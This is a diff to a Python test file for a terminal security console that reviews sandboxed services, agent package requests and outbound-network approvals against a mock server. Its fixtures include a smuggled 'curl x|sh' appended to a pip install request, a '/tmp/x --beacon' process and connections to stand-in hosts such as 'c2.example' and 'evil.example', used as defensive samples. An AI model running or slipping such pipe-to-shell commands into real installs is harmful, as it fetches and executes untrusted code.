@@ -1680,9 +1680,10 @@ async def test_tui_local_chat_shows_local_during_its_first_turn(cfg, tmp_path, m
 
 # --- boxes: services, packages, processes, profiles, /vms (docs/boxes-contract.md) ----
 
-def _boxes_server(seen, lan_ip="", token="sess"):
-    """The security server plus the boxes contract's routes, answering with
-    contract-shaped rows (section J). Records (method, path, query, body)."""
+def _boxes_server(seen, lan_ip="", token="sess", procs_enabled=True, docker_ok=True,
+                  lan_conf="", lan_error=None):
+    """The security server plus the boxes routes, answering with the shapes in
+    docs/boxes-api-final.md. Records (method, path, query, body)."""
     base = _security_server(seen, token)
     svc = {"id": 11, "project_slug": "demo", "name": "api", "description": "the demo API",
            "command": ["python3", "-m", "http.server", "8080"], "workdir": "srv",
@@ -1690,18 +1691,28 @@ def _boxes_server(seen, lan_ip="", token="sess"):
                                            "purpose": "http", "expose": "host"}],
            "restart": "on-failure", "egress_hosts": ["pypi.org"], "env": {"MODE": "prod"},
            "reason": "keep the API up", "artifact_sha256": "ab" * 32,
+           "definition_sha256": "de" * 32,
            "placement": "per_project", "expose_ports": [], "status": "pending",
            "desired_state": "running", "supersedes_id": None, "box_id": None,
-           "state": "unreported", "last_reported_at": None,
-           "created_at": "2026-09-26 09:00:00", "decided_at": None}
+           "state": "unreported", "error": None, "last_reported_at": None,
+           "created_at": "2026-09-26 09:00:00", "decided_at": None, "decided_by": None,
+           "decision_note": None, "requested_by": "agent", "conversation_id": "c1"}
     running = {**svc, "id": 9, "name": "worker", "status": "approved", "state": "running",
                "box_id": "s-demo", "expose_ports": [{"port": 9000, "bind": "loopback"}]}
+    broken = {**svc, "id": 12, "name": "cron", "status": "approved", "state": "unreported",
+              "desired_state": "stopped", "box_id": "s-demo",
+              "error": "svcd did not answer for 90 s"}
     pkg = {"id": 3, "project_slug": "demo", "source": "agent", "manager": "pip",
            "package": "requests", "version_req": ">=2", "resolved_version": "2.32.3",
            "integrity": "sha256:ff", "requested_command": "pip install requests; curl x|sh",
            "canonical_command": "pip install --no-deps requests==2.32.3",
            "reason": "http client", "status": "pending", "target_variant": "dev",
-           "variant_used_by": ["demo", "site"], "created_at": "2026-09-26 08:00:00"}
+           "decided_by": None, "decided_at": None, "built_version": None,
+           "variant_used_by": ["demo", "site"],
+           "variant_used_by_detail": {"all": ["demo", "site"], "direct": ["demo"],
+                                      "via": {"dev-go": ["site"]}},
+           "card": "installs into `dev` — used by: demo, site",
+           "created_at": "2026-09-26 08:00:00"}
     done_pkg = {**pkg, "id": 2, "package": "rich", "status": "built",
                 "created_at": "2026-09-20 08:00:00"}
     conn_ok = {"proto": "tcp", "dir": "out", "laddr": "10.201.50.2", "lport": 40000,
@@ -1713,8 +1724,17 @@ def _boxes_server(seen, lan_ip="", token="sess"):
     child = {"pid": 101, "ppid": 100, "user": "svc", "exe": "/tmp/x", "cmd": "/tmp/x --beacon",
              "unit": None, "service_id": None, "tag": "unexpected", "rss": 1_000_000,
              "cpu_pct": 0.0, "started": "09:05", "conns": [conn_bad], "children": []}
-    procs = {"boxes": [{"box_id": "s-demo", "kind": "service", "project": "demo",
+    orphan = {**conn_ok, "lport": 41999, "host": "c2.example", "guest_bytes_out": None,
+              "guest_bytes_in": None, "host_bytes_out": 70000, "host_bytes_in": 300,
+              "verified": False}
+    procs = {"enabled": procs_enabled, "boxes": [] if not procs_enabled else [
+                       {"box_id": "s-demo", "kind": "service", "project": "demo",
                         "reported_at": "2026-09-26 10:00:00", "stale": False,
+                        "error": None, "baseline": "builtin", "truncated": True,
+                        "totals": {"procs": 2, "unexpected": 1, "conns": 2,
+                                   "guest_bytes_out": 1010, "guest_bytes_in": 50000,
+                                   "host_bytes_out": 971000, "host_bytes_in": 50300},
+                        "orphan_conns": [orphan],
                         "tree": [{"pid": 100, "ppid": 1, "user": "svc",
                                   "exe": "/usr/bin/python3", "cmd": "python3 worker.py",
                                   "unit": "jav3-svc-9", "service_id": 9, "tag": "service",
@@ -1745,20 +1765,35 @@ def _boxes_server(seen, lan_ip="", token="sess"):
          "disk": {"overlay_bytes": 2_000_000, "data_bytes": 5_000_000},
          "net": {"tap": "jvbr10", "host_ip": "10.201.10.1", "guest_ip": "10.201.10.2"}}],
         "budget": {"ram_mb_used": 1536, "ram_mb_cap": 2250, "boxes": 2, "boxes_cap": 4,
-                   "project_boxes": 1, "project_boxes_cap": 1}}
+                   "project_boxes": 1, "project_boxes_cap": 1},
+        "runtimes": {"kvm": {"available": True, "reason": None},
+                     "docker": ({"available": True, "reason": None, "rootless": False,
+                                 "userns": False, "gvisor": False, "seccomp": True,
+                                 "weak": True,
+                                 "warnings": ["no user namespace: root in the container "
+                                              "is root on the host"]}
+                                if docker_ok else
+                                {"available": False, "reason": "docker_enabled is off",
+                                 "rootless": None, "userns": None, "gvisor": None,
+                                 "seccomp": None, "weak": False, "warnings": []})}}
     images = {"variants": [{"name": "dev", "from": "main", "builtin": True,
                             "recipe": "apt golang", "recipe_sha256": "cd" * 32,
-                            "min_mem_mb": 768, "used_by": ["site"],
+                            "min_mem_mb": 768, "layer_packages": [], "needs_build": True,
+                            "used_by": ["site"],
                             "versions": [{"version": "3", "base_version": "7",
                                           "size_bytes": 900_000_000,
                                           "built_at": "2026-09-20", "status": "built",
-                                          "active": True, "in_use_by": ["p-site"]}]}],
-              "build": {"running": False, "variant": None, "phase": None}}
+                                          "active": True, "recipe_sha256": "ee" * 32,
+                                          "in_use_by": ["p-site"]}]}],
+              "build": {"running": True, "variant": "dev", "mode": "layer", "phase": "run",
+                        "log_tail": ["Get:1 http://deb.debian.org golang [1]",
+                                     "Setting up golang"]}}
 
     def handler(request: httpx.Request) -> httpx.Response:
         path, method = request.url.path, request.method
         mine = (path.startswith(("/api/services", "/api/packages", "/api/vm/",
-                                 "/api/profiles", "/api/egress/policy/"))
+                                 "/api/profiles", "/api/egress/policy/", "/api/egress/allow",
+                                 "/api/egress/pending"))
                 or path.endswith("/profile"))
         if not mine:
             return base.handler(request)
@@ -1766,13 +1801,56 @@ def _boxes_server(seen, lan_ip="", token="sess"):
             return httpx.Response(401, json={"detail": "not authenticated"})
         body = json.loads(request.content) if request.content else None
         seen.append((method, path, dict(request.url.params), body))
+        if method == "POST" and path == "/api/profiles" and not (
+                (body or {}).get("service_placement") and (body or {}).get("box_runtime")):
+            return httpx.Response(422, json={"detail": [
+                {"loc": ["body", "service_placement"], "msg": "Field required",
+                 "type": "missing"}]})
+        if method == "DELETE" and path == "/api/profiles/1":
+            return httpx.Response(409, json={"detail": "a builtin profile cannot be deleted"})
+        if method == "PUT" and path == "/api/projects/__image_build__/profile":
+            return httpx.Response(409, json={"detail": "reserved"})
+        if method == "POST" and path.startswith("/api/packages/") and path.endswith("/approve"):
+            return httpx.Response(200, json={**pkg, "status": "approved",
+                                             "variant_used_by": pkg["variant_used_by"],
+                                             "build_started": True})
+        if method == "POST" and path.endswith("/promote"):
+            return httpx.Response(200, json={"ok": True, "host": body["host"],
+                                             "list": body["list"],
+                                             "profile": {"id": 1, "name": "Default"},
+                                             "removed_from_project": True})
+        if method == "POST" and path == "/api/egress/allow":
+            return httpx.Response(200, json={"ok": True, "host": body["host"],
+                                             "added_to": body["project"]})
+        if method == "POST" and path.endswith("/revoke") and path.startswith("/api/services/"):
+            return httpx.Response(200, json={**running, "status": "revoked",
+                                             "data_deleted": body.get("delete_data")})
+        if path == "/api/egress/pending":            # + one from the shared box, no turn
+            return httpx.Response(200, json={"pending": [
+                {"id": 1, "project_slug": "demo", "host": "evil.example", "hit_count": 3,
+                 "first_seen": "2026-09-25 09:00:00", "last_seen": "2026-09-25 10:00:00",
+                 "status": "pending"},
+                {"id": 2, "project_slug": "__general__", "host": "cdn.example",
+                 "hit_count": 1, "first_seen": "2026-09-25 09:00:00",
+                 "last_seen": "2026-09-25 09:00:00", "status": "pending"}]})
+        if path.startswith("/api/egress/pending/") and path.endswith("/approve"):
+            if path == "/api/egress/pending/2/approve" and not (body or {}).get("project"):
+                return httpx.Response(409, json={"detail": "choose the project"})
+            return httpx.Response(200, json={"ok": True, "added_to": (body or {}).get(
+                "project") or "demo"})
         if method != "GET":
             return httpx.Response(200, json={"ok": True})
         if path == "/api/services":
-            return httpx.Response(200, json={"services": [svc, running],
-                                             "services_lan_ip": lan_ip})
+            return httpx.Response(200, json={"services": [svc, running, broken],
+                                             "services_lan_ip": lan_ip,
+                                             "services_lan_ip_configured": lan_conf,
+                                             "lan_error": lan_error, "relays": []})
+        if path.endswith("/logs"):
+            return httpx.Response(200, json={
+                "service_id": int(path.split("/")[3]), "untrusted": True,
+                "text": "started [bold]ok[/] <b>x</b>\nlistening on :9000"})
         if path.startswith("/api/services/"):
-            return httpx.Response(200, json={**svc, "diff": None})
+            return httpx.Response(200, json={**svc, "diff": None, "relays": []})
         if path == "/api/packages":
             st = request.url.params.get("status")
             return httpx.Response(200, json={"packages": [p for p in (pkg, done_pkg)
@@ -1787,13 +1865,17 @@ def _boxes_server(seen, lan_ip="", token="sess"):
             return httpx.Response(200, json={"profiles": profiles})
         if path.startswith("/api/egress/policy/"):
             slug = path.rsplit("/", 1)[1]
-            if slug == "__general__":
-                return httpx.Response(404, json={"detail": "gone"})
+            own = ([], []) if slug == "__general__" else ([f"{slug}.dev"], ["tracker.example"])
             return httpx.Response(200, json={
-                "profile": {"id": 1, "name": "Default", "default": "deny"},
-                "project_allow": [f"{slug}.dev"], "project_deny": ["tracker.example"],
-                "effective_allow": [f"{slug}.dev", "pypi.org"],
-                "effective_deny": ["tracker.example", "bad.example"]})
+                "slug": slug,
+                "profile": {"id": 1, "name": "Default", "default": "deny",
+                            "network_off": False, "builtin": True},
+                "project_allow": own[0], "project_deny": own[1],
+                "effective_allow": own[0] + ["pypi.org"],
+                "effective_deny": own[1] + ["bad.example"],
+                "mode": "allowlist", "inherit_general": 1, "hosts": own[0],
+                "effective": own[0] + ["pypi.org"],
+                "source": "general" if slug == "__general__" else "project"})
         return httpx.Response(404, json={"detail": "nope"})
     return httpx.MockTransport(handler)
 
@@ -1900,9 +1982,13 @@ async def test_tui_queue_package_card_approve_and_reject(cfg):
         d = _text(scr.query_one("#sec-detail"))
         assert "curl x|sh" in d and "pip install --no-deps requests==2.32.3" in d
         assert "2.32.3" in d and "http client" in d and "used by: demo, site" in d
+        assert "directly: demo · via dev-go: site" in d        # variant_used_by_detail
+        row = next(r for r in _rows(scr) if "PKG" in r and "requests" in r)
+        assert "installs into `dev` — used by: demo, site" in row   # the server's card
         await pilot.press("y")
         assert await _modal(pilot, app, "Confirm")
         assert "Installs into `dev` — used by: demo, site" in app.screen.detail
+        assert "via dev-go: site" in app.screen.detail
         await pilot.press("escape")
         await pilot.pause(0.2)
         assert not [p for _, p, _ in _posts(seen) if p.startswith("/api/packages")]
@@ -1911,7 +1997,7 @@ async def test_tui_queue_package_card_approve_and_reject(cfg):
         await pilot.press("y")
         assert await _until(pilot, lambda: (
             "POST", "/api/packages/3/approve",
-            {"acknowledge": True, "target_variant": "dev"}) in _posts(seen))
+            {"acknowledge": True, "target_variant": "dev", "build": True}) in _posts(seen))
         # n: a reason, then a Confirm, then the reject
         assert await _until(pilot, lambda: app.screen is scr)
         scr.select_key("pk3")
@@ -1923,6 +2009,40 @@ async def test_tui_queue_package_card_approve_and_reject(cfg):
         await pilot.press("y")
         assert await _until(pilot, lambda: ("POST", "/api/packages/3/reject",
                                             {"reason": "not needed"}) in _posts(seen))
+
+
+async def test_tui_queue_unattributed_host_needs_a_project_and_lan_error_shows(cfg):
+    pytest.importorskip("textual")
+    seen: list = []
+    app = jav3.build_tui("http://h:1", "session:sess", transport=_boxes_server(
+        seen, lan_conf="192.168.1.1", lan_error="the router's own address"))
+    async with app.run_test(size=(160, 50)) as pilot:
+        await pilot.pause(0.3)
+        scr = await _screen(pilot, app, "/security", "SecurityScreen")
+        assert await _until(pilot, lambda: any("cdn.example" in r for r in _rows(scr)))
+        assert any("cdn.example" in r and "no project" in r for r in _rows(scr))
+        scr.select_key("v11")
+        d = _text(scr.query_one("#sec-detail"))
+        assert "192.168.1.1 is refused" in d and "the router's own address" in d
+        # the shared box's host: y asks which project first, then approves with it
+        scr.select_key("p2")
+        await pilot.press("y")
+        assert await _modal(pilot, app, "Picker")
+        assert [r[0] for r in app.screen.rows] == ["demo", "site"]
+        await pilot.press("down", "enter")
+        assert await _modal(pilot, app, "Confirm")
+        assert "site" in app.screen.question and "cdn.example" in app.screen.question
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/egress/pending/2/approve",
+                                            {"project": "site"}) in _posts(seen))
+        # an attributed one goes as before, no body
+        assert await _until(pilot, lambda: app.screen is scr)
+        scr.select_key("p1")
+        await pilot.press("y")
+        assert await _modal(pilot, app, "Confirm")
+        await pilot.press("y")
+        assert await _until(pilot, lambda: ("POST", "/api/egress/pending/1/approve", None)
+                            in _posts(seen))
 
 
 async def test_tui_network_groups_by_project_with_allow_deny_and_baseline(cfg):
@@ -2189,7 +2309,7 @@ async def test_tui_vms_boxes_images_catalogue(cfg):
         await pilot.press("y")
         assert await _until(pilot, lambda: (
             "POST", "/api/packages/3/approve",
-            {"acknowledge": True, "target_variant": "dev"}) in _posts(seen))
+            {"acknowledge": True, "target_variant": "dev", "build": True}) in _posts(seen))
         assert await _until(pilot, lambda: app.screen is scr)
         await pilot.press("escape")
         assert await _until(pilot, lambda: type(app.screen).__name__ != "VmsScreen")
